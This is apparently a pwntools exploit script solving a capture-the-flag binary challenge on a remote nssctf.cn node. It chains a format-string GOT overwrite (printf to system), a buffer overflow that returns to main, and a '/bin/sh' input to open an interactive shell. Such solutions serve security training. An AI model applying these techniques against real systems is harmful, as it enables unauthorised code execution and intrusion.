from pwn import *
from LibcSearcher import *
context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
#io=gdb.debug('./pwn')
#io=process('./pwn')
io=remote('node4.anna.nssctf.cn',28693)
elf=ELF('./pwn')
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive



printf=elf.got['printf']
system=elf.plt['system']
ru(b'please show me your name: ')
main=elf.sym['main']
#fmtstr_payload
    
payload=fmtstr_payload(6,{printf:system},write_size='short') 
#fmt_payload(,{addr:v},numbwritten=0,write_size='short')# int short byte 

sl(payload)

ru(b'!')
payload2=b'a'*(0x60-8)+p64(main)
s(payload2)

ru(b'name: ')
sl(b'/bin/sh\x00')



ii()
